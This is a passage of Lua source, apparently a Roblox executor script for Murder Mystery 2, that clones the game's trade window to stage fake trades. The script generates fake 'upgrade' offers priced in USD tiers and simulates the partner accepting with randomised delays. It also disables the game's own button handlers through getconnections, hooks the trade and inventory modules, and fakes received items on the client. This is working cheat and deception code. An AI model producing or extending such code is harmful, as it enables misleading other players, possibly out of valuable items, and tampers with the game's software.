        holder.DisplayOrder = 50
        holder.Parent = pgValue
        local clone = rrValue.Parent:Clone()
        clone.Visible = true
        clone.Size = UDim2.fromOffset(275,120)
        clone.AnchorPoint = Vector2.new(1,0)
        do
            local vpValue = workspace.CurrentCamera.ViewportSize
            local leaderboard = pgValue.MainGUI.Game.Leaderboard
            local apValue, asValue = leaderboard.AbsolutePosition, leaderboard.AbsoluteSize
            local rightX = apValue.X + asValue.X
            local belowY = apValue.Y + asValue.Y + 6
            if belowY + 120 > vpValue.Y - 10 then belowY = vpValue.Y - 140 end
            if belowY < 44 then belowY = 44 end
            clone.Position = UDim2.fromOffset(rightX, belowY)
        end
        clone.Parent = holder
        local receivingRequest = clone:FindFirstChild("ReceivingRequest")
        local sendingRequest = clone:FindFirstChild("SendingRequest")
        if sendingRequest then sendingRequest.Visible = false end
        if not receivingRequest then pcall(function() holder:Destroy() end); return end
        receivingRequest.Visible = true
        local uname = receivingRequest:FindFirstChild("Username")
        if uname then uname.Text = fromName end
        local accept = receivingRequest:FindFirstChild("Accept")
        local dec = receivingRequest:FindFirstChild("Decline")
        local function finish(accepted)
            if _G.pvReqToken ~= myTok then return end
            _G.pvReqToken = _G.pvReqToken + 1
            pcall(function() holder:Destroy() end)
            if accepted and onAccept then task.spawn(function() pcall(onAccept, fromName) end) end
        end
        if accept then pvSession.connect(accept.MouseButton1Click,function() finish(true) end) end
        if dec then pvSession.connect(dec.MouseButton1Click,function() finish(false) end) end
        task.delay(20, function() finish(false) end)
    end)
    if not success then notify("couldn't show request frame") end
    return fromName
end
function _G.pvShowClaim(itemName, category, count)
    category = category or "Weapons"
    count = count or 1
    pcall(function()
        local ips = require(replicatedStorageService.ClientServices.ItemPopupService)
        ips:AddNewItem(itemName, category, count)
    end)
end
-- USD bands apply to the complete incoming fake-upgrade offer.
-- The selected preset controls the next fake upgrade.
pvSession.upgradeTiers={
    poor={label="Poor",minimum=1,maximum=500},
    middle={label="Mid",minimum=1500,maximum=2999},
    rich={label="Rich",minimum=3000,maximum=50000},
}
pvSession.getUpgradeTier=function(key)
    key=key or settings.fakeUpgradeTier
    if not pvSession.upgradeTiers[key] then key="middle" end
    local default=pvSession.upgradeTiers[key]
    local minimum,maximum=default.minimum,default.maximum
    local ranges=type(settings.fakeUpgradeRanges)=="table" and settings.fakeUpgradeRanges or {}
    local saved=ranges[key]
    if type(saved)=="table" then
        local low,high=saved.minimum,saved.maximum
        local lowValid=type(low)=="number" and low==low and low>=0 and low<math.huge
        local highValid=type(high)=="number" and high==high and high>=0 and high<math.huge
        -- Older configs used false for an uncapped Rich maximum.
        if key=="rich" and high==false then high,highValid=default.maximum,true end
        if lowValid and highValid and low<=high then
            minimum=math.floor(low+0.5)
            maximum=high==math.huge and math.huge or math.floor(high+0.5)
        end
    end
    local range
    if maximum==math.huge then range=string.format("$%.2f+",minimum/100)
    else range=string.format("$%.2f – $%.2f",minimum/100,maximum/100) end
    return {key=key,label=default.label,range=range,minimum=minimum,maximum=maximum}
end
pvSession.selectedUpgradePreset=function()
    return pvSession.getUpgradeTier(settings.fakeUpgradeTier)
end
pvSession.recentUpgradeOffers={}
pvSession.rememberUpgradeOffer=function(tier,serial,offer)
    if #offer==0 then return end
    tier=tier or pvSession.getUpgradeTier()
    local key=tier.label or tier.key
    local history=pvSession.recentUpgradeOffers[key] or {}
    pvSession.recentUpgradeOffers[key]=history
    local names={}
    for _,weapon in ipairs(offer) do
        -- A Chroma and its regular version look similar enough to count as a repeat.
        names[tostring(weapon.name):lower():gsub("^chroma%s+","")]=true
    end
    if history[1] and history[1].serial==serial then table.remove(history,1) end
    table.insert(history,1,{serial=serial,names=names})
    if #history>6 then table.remove(history) end
end
pvSession.buildUpgradeOffer=function(wantCount,manualPicks,preset)
    local tier=preset or pvSession.getUpgradeTier()
    local rich=tier==pvSession.upgradeTiers.rich or tier.key=="rich"
    local mid=tier==pvSession.upgradeTiers.middle or tier.key=="middle"
    local candidates,byWeaponId,seen={},{},{}
    for _,weapon in ipairs(weapons) do
        local name=tostring(weapon.name or "")
        local base=name:gsub("^[Cc]hroma%s+","")
        local chroma=weapon.chroma==true or base~=name
        local prices
        if chroma then prices=PV_VALUES_CHROMA else prices=PV_VALUES end
        local value=prices and tonumber(prices[base])
        if weapon.tradable and not weapon.evo and not weapon.noSpawnAll
            and (weapon.rarity=="Godly" or weapon.rarity=="Ancient")
            and value and value>0 and value<math.huge then
            local cents=math.floor(value*100+0.5)
            local key=base:lower()..(chroma and "|c" or "|n")
            if cents>0 and cents<=tier.maximum then
                local record={weapon=weapon,cents=cents,family=base:lower()}
                byWeaponId[weapon.id]=record
                if not seen[key] then
                    seen[key]=true
                    table.insert(candidates,record)
                end
            end
        end
    end
    local function withinTier(cents)
        return cents>=tier.minimum and cents<=tier.maximum
    end
    -- Explicit picks are used only when their whole offer meets this tier.
    if type(manualPicks)=="table" and #manualPicks>0 and #manualPicks<=3 then
        local selected,used,total={},{},0
        for _,id in ipairs(manualPicks) do
            local record=byWeaponId[id]
            if not record or used[id] then break end
            if #manualPicks==2 and rich and record.cents<tier.minimum then break end
            used[id]=true
            total=total+record.cents
            table.insert(selected,record.weapon)
        end
        if #selected==#manualPicks and withinTier(total) then return selected,true end
    end
    table.sort(candidates,function(first,button)
        if first.cents~=button.cents then return first.cents<button.cents end
        return tostring(first.weapon.id)<tostring(button.weapon.id)
    end)
    local history=pvSession.recentUpgradeOffers[tier.label or tier.key] or {}
    local age={}
    for index,entry in ipairs(history) do
        for name in pairs(entry.names) do
            if not age[name] then age[name]=index end
        end
    end
    -- First try weapons absent from the last six offers in this tier. When
    -- the budget is tight, bring back one older trade at a time.
    local lastSize=0
    for cutoff=#history,0,-1 do
        local available={}
        for _,record in ipairs(candidates) do
            if not age[record.family] or age[record.family]>cutoff then
                table.insert(available,record)
            end
        end
        if #available>lastSize then
            lastSize=#available
            local chosen=pvSession.pickUpgradeWeapons(available,byWeaponId,tier,wantCount,rich,mid)
            if chosen then return chosen,false end
        end
    end
    return {},false
end
pvSession.pickUpgradeWeapons=function(candidates,byWeaponId,tier,wantCount,rich,mid)
    local function withinTier(cents)
        return cents>=tier.minimum and cents<=tier.maximum
    end
    -- Three-weapon offers may use smaller adds below the tier minimum.
    -- Find the third price in the sorted catalog without building a table of triples.
    local function lowerBound(cents,stop)
        local left,right=1,stop
        while left<right do
            local mid=math.floor((left+right)/2)
            if candidates[mid].cents<cents then left=mid+1 else right=mid end
        end
        return left
    end
    local function findTriple(twoMains)
        local number=#candidates
        if number<3 then return end
        local firstMain=math.max(3,lowerBound(math.ceil(tier.minimum/3),number+1))
        if firstMain>number then return end
        local startMain=math.random(firstMain,number)
        for step=0,number-firstMain do
            local index=firstMain+(startMain-firstMain+step)%(number-firstMain+1)
            local main=candidates[index]
            local startSecond=math.random(2,index-1)
            for offset=0,index-3 do
                local jValue=2+(startSecond-2+offset)%(index-2)
                local second=candidates[jValue]
                local subtotal=main.cents+second.cents
                local fitsShape=twoMains and second.cents*2>=main.cents
                    or not twoMains and second.cents*3<=main.cents
                if fitsShape and subtotal<tier.maximum then
                    local addLimit=twoMains and math.floor(second.cents/3) or second.cents
                    local low=lowerBound(tier.minimum-subtotal,jValue)
                    local high=lowerBound(math.min(addLimit,tier.maximum-subtotal)+1,jValue)-1
                    if low<=high then
                        local add=candidates[math.random(low,high)]
                        return {main.weapon,second.weapon,add.weapon}
                    end
                end
            end
        end
    end
    local function pickTriple()
        local twoMains=math.random()<0.5
        return findTriple(twoMains) or findTriple(not twoMains)
    end
    local tryThree=wantCount==3 or (not wantCount and math.random()<(rich and 0.08 or 0.30))
    if tryThree then
        local triple=pickTriple()
        if triple then return triple end
    end
    local singles,pairsOfWeapons={},{}
    for index,candidate in ipairs(candidates) do
        if withinTier(candidate.cents) then table.insert(singles,{candidate.weapon}) end
        if not rich or candidate.cents>=tier.minimum then
            for jValue=index+1,#candidates do
                local button=candidates[jValue]
                local total=candidate.cents+button.cents
                if total>tier.maximum then break end
                -- Let two comparable Mid weapons share the budget.
                if withinTier(total) and (not mid or candidate.cents>=tier.minimum or candidate.cents*2>=button.cents) then
                    table.insert(pairsOfWeapons,{candidate.weapon,button.weapon})
                end
            end
        end
    end
    local pool
    if wantCount==1 then pool=singles
    elseif wantCount==2 then pool=pairsOfWeapons
    else pool=math.random()<0.62 and singles or pairsOfWeapons end
    if #pool==0 then pool=#singles>0 and singles or pairsOfWeapons end
    if #pool==0 then
        if not tryThree then
            local triple=pickTriple()
            if triple then return triple end
        end
        return nil
    end
    if rich then
        local chosen,totalWeight=nil,0
        for _,offer in ipairs(pool) do
            local total=byWeaponId[offer[1].id].cents+(offer[2] and byWeaponId[offer[2].id].cents or 0)
            local weight=1/total
            totalWeight=totalWeight+weight
            if math.random()*totalWeight<weight then chosen=offer end
        end
        return chosen
    end
    return pool[math.random(1,#pool)]
end

-- Each mock trade owns a serial so canceled/previous trades cannot finish a newer one.
local spoofTradeSerial = 0
local cleanupTradeSpoof
function pvSession.sameTradePartner(first, button)
    local function normalize(value)
        local name = tostring(value or ""):lower()
        name = name:gsub("^%s+", ""):gsub("%s+$", "")
        name = name:gsub("^%(", ""):gsub("%)$", "")
        name = name:gsub("^@", "")
        return name
    end
    local left, right = normalize(first), normalize(button)
    return left ~= "" and right ~= "" and left == right
end

local function startTradeSpoof(partner, autoMode, noAdd, visualUpgradeTarget, upgradePreset)
    -- Resolve later Trade Spoof requests only to the accepted upgrade's avatar.
    if not visualUpgradeTarget then
        local target=pvSession.upgradePartner
        if target and target==_G.pvVisualWeaponTarget and target.Character
            and target.Character.Parent and pvSession.sameTradePartner(partner,target.Name) then
            visualUpgradeTarget=target
        end
    end


    if spoofBusy then return false,"busy" end
    -- Close any stale trade before cloning a new window and wiring its buttons.
    if spoofOpen and cleanupTradeSpoof then pcall(cleanupTradeSpoof) end
    local target=spoofSurface(); if not target then return false,"no trade gui" end
    if not target:FindFirstChild("Container") then
        return false,"trade window not available here (open a real trade first)"
    end
    spoofBusy=true;task.delay(1.2,function() spoofBusy=false end)
    local okM,result=pcall(function() return require(replicatedStorageService.Modules.TradeModule) end)
    local okI,result2=pcall(function() return require(replicatedStorageService.Modules.InventoryModule) end)
    if not (okM and okI) then spoofBusy=false;return false,"trade modules missing" end
    spoofTradeSerial = spoofTradeSerial + 1
    local thisTradeSerial = spoofTradeSerial
    -- Latch partner identity BEFORE callbacks can clear or replace session state.
    local isUpgradeReturnTrade = autoMode ~= true
        and pvSession.sameTradePartner(partner, pvSession.pendingUpgradeReturnName)
    local originalTradeInventory = result.TradeInventory
    tradeModules = { TM = result, IM = result2, originalInventory = originalTradeInventory }
    settings.tradeHook=true;offered={};spoofOpen=true;_G.pvSpoofActive=true
    pvSession.valueHelperAuto=autoMode==true
    theirOfferedRef=nil
    _G.pvOfferLocked=false
    gridState={}
    pcall(function() target.Enabled=true end)
    pcall(function() buildTradeGrid(target,result2) end)


    task.spawn(function()
        local function visibleWeaponsCont()
            local items2=target.Container and target.Container:FindFirstChild("Items"); if not items2 then return end
            for _,lname in ipairs({"Main","_mO"}) do
                local layout=items2:FindFirstChild(lname)
                if layout and layout.Visible then
                    local weapons2=layout:FindFirstChild("Weapons")
                    local child; if weapons2 then pcall(function() child=weapons2.Items.Container.Current.Container end) end
                    return child
                end
            end
        end
        for _=1,20 do
            task.wait(0.15)
            if not spoofOpen or not target.Parent then return end
            local cont=visibleWeaponsCont()
            local vis=0
            if cont then for _,value in ipairs(cont:GetChildren()) do if value.Name=="NewItem" and value.Visible then vis=vis+1 end end end
            if vis>0 then return end
            gridState={}
            pcall(function() buildTradeGrid(target,result2) end)
        end
    end)


    _G.pvSpoofName = "("..(partner or "porkVisuals")..")"
    pcall(function() target.Container.Trade.TheirOffer.Username.Text=_G.pvSpoofName end)
    pcall(function()
        local toc=target.Container.Trade.TheirOffer.Container
        for index=1,4 do
            local newItem=toc:FindFirstChild("NewItem"..index)
            if newItem then newItem.Visible=false;local icon=newItem:FindFirstChild("Icon",true); if icon then icon.Image="" end end
        end
    end)
    task.wait(0.05)
    pcall(hookTradeItems);pcall(hookOfferSlots)
    pcall(function()
        local acts=target:FindFirstChild("Container") and target.Container:FindFirstChild("Trade")
                   and target.Container.Trade:FindFirstChild("Actions")
        local dec=acts and acts:FindFirstChild("Decline")
        if not dec then return end
        -- Decline may itself be a GuiButton or contain an ActionButton.
        -- The cloned trade GUI has no running LocalScripts, so wire either shape.
        local declineTriggered=false
        local function wireDecline(button)
            if not button:IsA("GuiButton") or button:GetAttribute("pvDecline") then return end
            button:SetAttribute("pvDecline",true)
            local function onDecline()
                if declineTriggered then return end
                declineTriggered=true
                pcall(function() if cleanupTradeSpoof then cleanupTradeSpoof() end end)
                pcall(function()
                    local mine=playerGui2:FindFirstChild("pvTradeGUI")
                    if mine then mine:Destroy() end
                end)
                pcall(notify,"Trade declined")
            end
            pvSession.connect(button.MouseButton1Click,onDecline)
            pvSession.connect(button.Activated,onDecline)
        end
        wireDecline(dec)
        for _,button in ipairs(dec:GetDescendants()) do wireDecline(button) end
    end)
    pcall(function()
        local acts=target:FindFirstChild("Container") and target.Container:FindFirstChild("Trade") and target.Container.Trade:FindFirstChild("Actions")
        local accept=acts and acts:FindFirstChild("Accept")
        if not accept then return end
        local mainBtn = accept:FindFirstChild("ActionButton")
        local confirm = accept:FindFirstChild("Confirm")
        local cancel  = accept:FindFirstChild("Cancel")
        local cdFrame = accept:FindFirstChild("Cooldown")
        local addItem = accept:FindFirstChild("AddItem")
        if not (mainBtn and confirm and cancel) then return end
        local confBtn = confirm:FindFirstChild("ActionButton")
        local cancBtn = cancel:FindFirstChild("ActionButton")
        local myAcc    = target.Container.Trade.YourOffer:FindFirstChild("Accepted")
        local theirAcc = target.Container.Trade.TheirOffer:FindFirstChild("Accepted")
        local GREEN=Color3.fromRGB(60,205,70)
        local GREY =Color3.fromRGB(120,120,124)
        local function dress(frame,text,col)
            if not frame then return end
            pcall(function() frame.BackgroundColor3=col end)
            for _,data in ipairs(frame:GetDescendants()) do
                if data:IsA("TextLabel") then pcall(function() data.Text=text end) end
                if data:IsA("ImageLabel") then pcall(function() data.BackgroundColor3=col end) end
            end
        end
        dress(confirm,"ARE YOU SURE?",GREEN)
        dress(cancel ,"CANCEL",       GREY)
        local COOLDOWN=5
        local coolTok=0
        local cdTitle=cdFrame and cdFrame:FindFirstChild("Title")
        local function coolingDown() return cdFrame~=nil and cdFrame.Visible end
        local function runCooldown()
            if not cdFrame then return end
            coolTok=coolTok+1
            local tok=coolTok
            pcall(function() cdFrame.Visible=true end)
            task.spawn(function()
                for number=COOLDOWN,1,-1 do
                    if tok~=coolTok then return end
                    pcall(function()
                        if cdTitle then cdTitle.Text=" Please wait ("..number..") before accepting." end
                    end)
                    task.wait(1)
                end
                if tok~=coolTok then return end
                pcall(function() cdFrame.Visible=false end)
            end)
        end
        armCooldown=runCooldown
        _G.pvCoolingDown = coolingDown
        local function reset()
            pcall(function()
                confirm.Visible=false
                cancel.Visible=false
                if myAcc then myAcc.Visible=false end
                if theirAcc then theirAcc.Visible=false end
                if addItem then addItem.Visible=false end
                if cdFrame then cdFrame.Visible=false end
            end)
        end
        reset()
        pcall(function() result.ResetCooldown(true) end)
        _G.pvSuspended = _G.pvSuspended or {}
        local function drop(button)
            if button and getconnections then
                pcall(function()
                    for _,child in ipairs(getconnections(button.MouseButton1Click)) do
                        if child.Disable then
                            pcall(function() child:Disable() end)
                            _G.pvSuspended[#_G.pvSuspended+1] = child
                        else
                            pcall(function() child:Disconnect() end)
                        end
                    end
                end)
            end
        end
        drop(mainBtn);drop(confBtn);drop(cancBtn)
        _G.pvRestoreMM2 = function()
            for _,child in ipairs(_G.pvSuspended or {}) do
                if child.Enable then pcall(function() child:Enable() end) end
            end
            _G.pvSuspended = {}
            pcall(function()
                local TM2 = require(replicatedStorageService.Modules.TradeModule)
                if TM2 and TM2.ConnectActions then TM2.ConnectActions() end
            end)
        end
        local function stage()
            if cancel.Visible  then return "accepted" end
            if confirm.Visible then return "confirm"  end
            return "idle"
        end
        local claimedOnce = false
        local confirmSerial = 0
        local mainBtnHandler = function()
            if coolingDown() then
                notify("Please wait for the cooldown to finish.")
                return
            end
            if stage() ~= "idle" then return end
            if #offered == 0 and not autoMode then
                notify("Put something up first"); return
            end
            pcall(function() confirm.Visible = true end)
        end
        tradeModules.mainBtnConnection = pvSession.connect(mainBtn.MouseButton1Click,mainBtnHandler)
        tradeModules.mainBtnActivatedConnection = pvSession.connect(mainBtn.Activated,mainBtnHandler)
        if confBtn then
            local confirmHandler = function()
                if coolingDown() or stage()~="confirm" then return end
                pcall(function()
                    confirm.Visible=false
                    cancel.Visible=true
                    if myAcc then myAcc.Visible=true end
                end)
                _G.pvOfferLocked = true
                if isUpgradeReturnTrade then
                    notify("Visual return accepted; finishing trade...")
                end
                confirmSerial = confirmSerial + 1
                local thisConfirm = confirmSerial
                -- Do not test cancel.Visible after a delay: the cloned MM2 UI can
                -- change its visual stage while a valid spoof trade is finishing.
                -- Instead, require the same still-active trade and no Cancel/Decline.
                task.delay(1.1,function()
                    if not isCurrent() or thisTradeSerial ~= spoofTradeSerial
                        or thisConfirm ~= confirmSerial or not spoofOpen then return end
                    pcall(function() if theirAcc then theirAcc.Visible=true end end)
                    task.delay(1.3,function()
                        if not isCurrent() or thisTradeSerial ~= spoofTradeSerial
                            or thisConfirm ~= confirmSerial or not spoofOpen then return end
                        -- Both confirmations are final and still belong to this trade.
                        if autoMode and upgradePreset then
                            pvSession.pendingUpgradeReturnName = partner
                            pvSession.upgradePartner = visualUpgradeTarget
                        elseif isUpgradeReturnTrade then
                            pvSession.clearUpgradePartnerInput(partner)
                            pvSession.pendingUpgradeReturnName = nil
                            pvSession.upgradePartner = nil
                        end
                        local received = {}
                        if autoMode and theirOfferedRef then
                            for _,theirOfferedRefItem in ipairs(theirOfferedRef) do
                                received[#received+1] = {name=theirOfferedRefItem.name, icon=theirOfferedRefItem.icon, id=theirOfferedRefItem.id,
                                                         count=theirOfferedRefItem.count or 1}
                            end
                        end


                        if partner and partner~="" and #offered>0 then
                            _G.pvGaveTo = _G.pvGaveTo or {}
                            local key = tostring(partner):lower()
                            _G.pvGaveTo[key] = _G.pvGaveTo[key] or {}
                            for _,offeredItem in ipairs(offered) do
                                _G.pvGaveTo[key][#_G.pvGaveTo[key]+1] =
                                    {id=offeredItem.id, name=offeredItem.name, icon=offeredItem.icon, count=offeredItem.count or 1}
                            end


                            while #_G.pvGaveTo[key] > 24 do table.remove(_G.pvGaveTo[key], 1) end
                        end
                        -- Snapshot this trade's outgoing items; compare unit USD, not stacks.
                        local chosen={}
                        if visualUpgradeTarget and not claimedOnce
                            and visualUpgradeTarget==_G.pvVisualWeaponTarget
                            and visualUpgradeTarget.Character and visualUpgradeTarget.Character.Parent then
                            for _,offeredItem in ipairs(offered) do
                                local item=byId[offeredItem.id]
                                local entry=Sync.Weapons[offeredItem.id]
                                local slot=(item and item.type) or (entry and entry.ItemType)
                                if slot=="Sword" then slot="Knife" end
                                if slot=="Knife" or slot=="Gun" then
                                    local name=tostring((entry and entry.ItemName) or (item and item.name) or offeredItem.name or offeredItem.id)
                                    local base=name:gsub("^[Cc]hroma%s+","")
                                    local chroma=(entry and entry.Chroma) or (item and item.chroma) or base~=name
                                    local value=(chroma and PV_VALUES_CHROMA and PV_VALUES_CHROMA[base])
                                        or (PV_VALUES and PV_VALUES[base])
                                    value=tonumber(value) or 0
                                    if not chosen[slot] or value>chosen[slot].value then
                                        chosen[slot]={id=offeredItem.id,value=value}
                                    end
                                end
                            end
                        end
                        -- Only the weapons WE gave can qualify the helper for
                        -- success; items received from the visual player do not.
                        local sentForHelper={}
                        for _,offeredItem in ipairs(offered) do
                            sentForHelper[#sentForHelper+1]={
                                id=offeredItem.id,name=offeredItem.name,amount=offeredItem.count or 1
                            }
                        end
                        -- Inventory bookkeeping must never suppress the success
                        -- notification or partner reset if it throws.
                        local consumed,consumeError=pcall(consumeOffered)
                        if not consumed then warn("[pv visual trade] inventory: ",consumeError) end
                        _G.pvSpoofActive = false
                        pcall(function() target.Enabled = false end)
                        pcall(reset)
                        notify(isUpgradeReturnTrade and "Visual return trade complete."
                            or "Trade complete.")
                        if type(pvSession.showUpgradeTradeSuccess)=="function" then
                            pcall(pvSession.showUpgradeTradeSuccess,"Visual trade",sentForHelper)
                        end
                        if next(chosen) then
                            task.delay(5,function()
                                -- Removed/replaced avatars and old script sessions cannot equip.
                                if not isCurrent() or visualUpgradeTarget~=_G.pvVisualWeaponTarget
                                    or not visualUpgradeTarget.Character
                                    or not visualUpgradeTarget.Character.Parent then return end
                                local equippedAny=false
                                local equipOrder={}
                                if chosen.Knife then equipOrder[#equipOrder+1]="Knife" end
                                if chosen.Gun then equipOrder[#equipOrder+1]="Gun" end
                                if #equipOrder==2 and math.random(1,2)==2 then
                                    equipOrder[1],equipOrder[2]=equipOrder[2],equipOrder[1]
                                end
                                for index,slot in ipairs(equipOrder) do
                                    if index>1 then task.wait(1) end
                                    -- Revalidate after waiting: never equip a replacement avatar.
                                    if not isCurrent() or visualUpgradeTarget~=_G.pvVisualWeaponTarget
                                        or not visualUpgradeTarget.Character
                                        or not visualUpgradeTarget.Character.Parent then return end
                                    local item=chosen[slot]
                                    local success,shown,reason=pcall(pvSkinOther,visualUpgradeTarget,slot,item.id)
                                    warn("[AutoEquip]", "item:", tostring(item.id),
                                        "function:", type(pvSkinOther), "ok:", success,
                                        "result:", tostring(shown), "reason:", tostring(reason))
                                    if success and shown then
                                        equippedAny=true
                                        pcall(pvVisualDefaultVisibility,visualUpgradeTarget.Character,slot,false)
                                    else
                                        notify("Could not display "..tostring(item.id).." on the visual player")
                                    end
                                end
                                if equippedAny and type(pvSession.queueUpgradeMessage)=="function" then
                                    pvSession.queueUpgradeMessage(visualUpgradeTarget)
                                end
                            end)
                        end
                        if not claimedOnce then
                            claimedOnce = true


                            local lastRid, lastAmt
                            for _,receivedItem in ipairs(received) do
                                local rid = receivedItem.id
                                local got = receivedItem.count or 1
                                if rid then
                                    local have = ProfileData.Weapons.Owned[rid] or 0
                                    ProfileData.Weapons.Owned[rid] = have + got
                                    lastRid, lastAmt = rid, have + got
                                end

                                if _G.pvShowClaim then
                                    pcall(_G.pvShowClaim, rid or receivedItem.name, "Weapons", got)
                                end
                            end


                            if lastRid then
                                _G.pvPendingInv = {lastRid, lastAmt}
                            end
                            pcall(saveCfg)
                        end
                        task.delay(0.15,function()
                            -- Never let a delayed cleanup close a different trade.
                            if thisTradeSerial == spoofTradeSerial and cleanupTradeSpoof then
                                pcall(cleanupTradeSpoof)
                            end
                        end)
                    end)
                end)
            end
            tradeModules.confBtnConnection = pvSession.connect(confBtn.MouseButton1Click,confirmHandler)
            tradeModules.confBtnActivatedConnection = pvSession.connect(confBtn.Activated,confirmHandler)
        end
        if cancBtn then
            local cancelHandler = function()
                confirmSerial = confirmSerial + 1 -- invalidate pending confirmation
                _G.pvOfferLocked=false
                reset();clearOffer()
            end
            tradeModules.cancBtnConnection = pvSession.connect(cancBtn.MouseButton1Click,cancelHandler)
            tradeModules.cancBtnActivatedConnection = pvSession.connect(cancBtn.Activated,cancelHandler)
        end
        if autoMode and not noAdd then
            local theirOffered = {}
            theirOfferedRef = theirOffered
            local taken={}
            local function put(item)

                if not item or taken[item.id] or #theirOffered>=3 then return end
                taken[item.id]=true
                table.insert(theirOffered,{name=item.name,icon=item.img,id=item.id,col=offerColour(nil,item.id)})
            end


            local enforceTheirOffer


            local manualOffer=false
            local function rollOffer(wantCount)
                for index=#theirOffered,1,-1 do
                    taken[theirOffered[index].id]=nil
                    table.remove(theirOffered,index)
                end
                local selection
                selection,manualOffer=pvSession.buildUpgradeOffer(wantCount,_G.pvFakePicks,upgradePreset)
                for _,weapon in ipairs(selection) do put(weapon) end
                if #selection==0 then
                    notify("No priced Godly/Ancient offer fits "..(upgradePreset or pvSession.getUpgradeTier()).label..".")
                end
            end
            local function rememberOffer()
                pvSession.rememberUpgradeOffer(upgradePreset,thisTradeSerial,theirOffered)
            end
            rollOffer(nil)
            rememberOffer()

            _G.pvForceFakeReroll = function()
                if not spoofOpen or thisTradeSerial~=spoofTradeSerial then return end
                rollOffer(nil)
                rememberOffer()
                for index=1,4 do pcall(enforceTheirOffer,index) end
            end
            _G.pvSyncFake = function()
                if not spoofOpen or thisTradeSerial~=spoofTradeSerial then return end

                if manualOffer then
                    for index=1,4 do pcall(enforceTheirOffer,index) end
                    return
                end
                local mine, myCount = {}, 0
                for _,offeredItem in ipairs(offered) do
                    myCount = myCount + 1
                    if offeredItem.id then mine[offeredItem.id]=true end
                    if offeredItem.name then mine[pvNorm(tostring(offeredItem.name):gsub("^[Cc]hroma%s*",""))]=true end
                end

                local want = #theirOffered>0 and #theirOffered or nil
                local clash=false
                for _,theirOfferedItem in ipairs(theirOffered) do
                    if (theirOfferedItem.id and mine[theirOfferedItem.id]) or (theirOfferedItem.name and mine[pvNorm(tostring(theirOfferedItem.name):gsub("^[Cc]hroma%s*",""))]) then
                        clash=true break
                    end
                end
                if not clash then return end
                for attempt=1,12 do
                    rollOffer(want)
                    local bad=false
                    for _,theirOfferedItem in ipairs(theirOffered) do
                        if (theirOfferedItem.id and mine[theirOfferedItem.id]) or (theirOfferedItem.name and mine[pvNorm(tostring(theirOfferedItem.name):gsub("^[Cc]hroma%s*",""))]) then
                            bad=true break
                        end
                    end
                    if not bad then break end
                end
                rememberOffer()
                for index=1,4 do pcall(enforceTheirOffer,index) end
            end
            enforceTheirOffer = function(index)
                local toc = target.Container.Trade.TheirOffer.Container
                if not toc then return end
                local newItem = toc:FindFirstChild("NewItem"..index)
                local oValue = theirOffered[index]
                if newItem and oValue then
                    local icon = newItem:FindFirstChild("Icon", true); if icon then icon.Image = oValue.icon end
                    local itemName = newItem:FindFirstChild("ItemName", true); local label = itemName and itemName:FindFirstChild("Label")
                    if label then label.Text = oValue.name end
                    if itemName and oValue.col then itemName.BackgroundColor3 = oValue.col end


                    local amount = newItem:FindFirstChild("Amount", true)
                    if amount and amount:IsA("TextLabel") then
                        local want = (oValue.count and oValue.count > 1) and ("x"..oValue.count) or ""
                        if amount.Text ~= want then amount.Text = want end
                    end
                    pcall(pvOfferBadge, newItem, oValue.id)
                    if not newItem.Visible then newItem.Visible = true end
                elseif newItem then


                    local icon = newItem:FindFirstChild("Icon", true); if icon then icon.Image = "" end
                    local itemName = newItem:FindFirstChild("ItemName", true)
                    local label = itemName and itemName:FindFirstChild("Label")
                    if label then label.Text = "" end
                    if itemName then itemName.BackgroundColor3 = GREY_SLOT end
                    local amount = newItem:FindFirstChild("Amount", true)
                    if amount and amount:IsA("TextLabel") and amount.Text ~= "" then amount.Text = "" end
                    newItem.Visible = false
                end
            end
            task.spawn(function()
                task.wait(0.25 + math.random()*0.35)
                if not spoofOpen then return end


                for index=1,#theirOffered do
                    if not spoofOpen then return end
                    pcall(enforceTheirOffer,index)


                    pcall(armCooldown)
                    if index < #theirOffered then task.wait(0.85 + math.random()*0.4) end
                end
                for _=1,12 do
                    if not spoofOpen then return end
                    for index=1,4 do pcall(enforceTheirOffer,index) end
                    local shown=false
                    pcall(function()
                        local text=target.Container.Trade.TheirOffer.Container:FindFirstChild("NewItem1")
                        shown = text ~= nil and text.Visible
                    end)
                    if shown then break end
                    task.wait(0.1)
                end


                if _G.pvBotAcceptsFirst then
                    task.spawn(function()
                        while spoofOpen and _G.pvSpoofActive do
                            local okEnabled,enabled=pcall(function() return target.Enabled end)
                            if not (okEnabled and enabled) then break end
                            local cooling=false
                            pcall(function() cooling=_G.pvCoolingDown and _G.pvCoolingDown() end)
                            local taValue
                            pcall(function() taValue=target.Container.Trade.TheirOffer:FindFirstChild("Accepted") end)
                            if taValue then
                                if cooling then
                                    if taValue.Visible then pcall(function() taValue.Visible=false end) end
                                elseif not taValue.Visible then
                                    task.wait(0.3 + math.random()*0.3)
                                    local stillCool=false
                                    pcall(function() stillCool=_G.pvCoolingDown and _G.pvCoolingDown() end)
                                    if spoofOpen and _G.pvSpoofActive and not stillCool then
                                        pcall(function() taValue.Visible=true end)
                                    end
                                end
                            end
                            task.wait(0.25)
                        end
                    end)
                end
            end)
        end
    end)
    return true
end
